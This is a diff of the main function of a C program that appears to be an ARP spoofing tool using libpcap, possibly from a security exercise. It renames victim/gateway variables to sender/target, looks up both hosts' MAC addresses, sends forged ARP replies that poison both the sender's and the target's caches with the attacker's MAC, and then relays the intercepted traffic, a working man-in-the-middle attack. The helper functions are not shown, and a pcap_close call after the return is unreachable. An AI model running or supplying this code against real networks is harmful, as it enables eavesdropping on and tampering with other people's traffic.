@@ -16,21 +16,19 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 	u_int8_t attacker_mac[6];
-	u_int8_t victim_mac[6];
-	u_int8_t gate_mac[6];
+	u_int8_t sender_mac[6];
+	u_int8_t target_mac[6];
 	u_int8_t broad_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 	u_int8_t empty_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
 
 	u_int8_t attacker_ip[4];
-	u_int8_t victim_ip[4];
-	u_int8_t gate_ip[4];
-	u_int8_t gate[4] = {10, 1, 1, 1};
-	u_int8_t victim[4] = {192, 168, 123, 2};
+	u_int8_t sender_ip[4];
+	u_int8_t target_ip[4];
 
 	char *dev = argv[1];
 	char *result;
-	argv_ip(argv[2], victim_ip);
-	argv_ip(argv[3], gate_ip);
+	argv_ip(argv[2], sender_ip);
+	argv_ip(argv[3], target_ip);
 	my_mac(dev, attacker_mac);
 	s_getIpAddress(dev, attacker_ip);
 	char errbuf[PCAP_ERRBUF_SIZE];
@@ -41,27 +39,32 @@ int main(int argc, char *argv[])
 		return -1;
 	}
 
-	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, gate_ip, 0);
-	reply(dev, pcap, gate_mac, gate_ip);
-	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, victim_ip, 0);
-	reply(dev, pcap, victim_mac, victim_ip);
+	// request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, target_ip, 0);
+	// reply(dev, pcap, target_mac, target_ip);
+	// request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, sender_ip, 0);
+	// reply(dev, pcap, sender_mac, sender_ip);
+
+	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, target_ip, htons(ArpHdr::Request));
+	reply(dev, pcap, target_mac, target_ip);
+	request(dev, pcap, broad_mac, attacker_mac, attacker_mac, attacker_ip, empty_mac, sender_ip, htons(ArpHdr::Request));
+	reply(dev, pcap, sender_mac, sender_ip);
 
 	printf("attacker ip addr : ");
 	print_ip(attacker_ip);
 	printf("sender ip addr : ");
-	print_ip(victim_ip);
+	print_ip(sender_ip);
 	printf("target ip addr : ");
-	print_ip(gate_ip);
+	print_ip(target_ip);
 	printf("attacker mac addr : ");
 	print_mac(attacker_mac);
 	printf("sender mac addr : ");
-	print_mac(victim_mac);
+	print_mac(sender_mac);
 	printf("target mac addr : ");
-	print_mac(gate_mac);
+	print_mac(target_mac);
 
-	request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
-	request(dev, pcap, gate_mac, attacker_mac, attacker_mac, victim_ip, gate_mac, gate_ip, 1);
-	relay(dev, pcap, attacker_mac, victim_mac, gate_mac, victim_ip, gate_ip);
+	request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, htons(ArpHdr::Reply));
+	request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, htons(ArpHdr::Reply));
+	relay(dev, pcap, attacker_mac, sender_mac, target_mac, sender_ip, target_ip);
 
 	return 0;
 	pcap_close(pcap);
